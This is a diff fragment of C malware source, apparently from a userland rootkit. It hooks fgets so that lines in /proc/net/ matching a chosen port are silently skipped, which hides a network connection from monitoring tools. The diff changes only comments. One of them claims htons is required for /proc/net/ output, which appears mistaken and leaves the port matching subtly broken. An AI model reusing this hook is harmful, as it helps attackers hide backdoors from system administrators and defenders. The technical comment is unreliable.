@@ -11,11 +11,13 @@ char *fgets(char *s, int size, FILE *stream) {
     char *ret = orig(s, size, stream);
     if (ret) {
         char target[16];
+        
+        // Works for any port: automatically handles the Big-Endian hex conversion required by /proc/net/
         unsigned short net_port = htons(PORT_TO_HIDE);
         snprintf(target, sizeof(target), ":%04X", net_port);
 
         if (strstr(s, target)) {
-            // Safely grab the next line using the original system function
+            // Safely skip the line using the original system function
             return orig(s, size, stream);
         }
     }
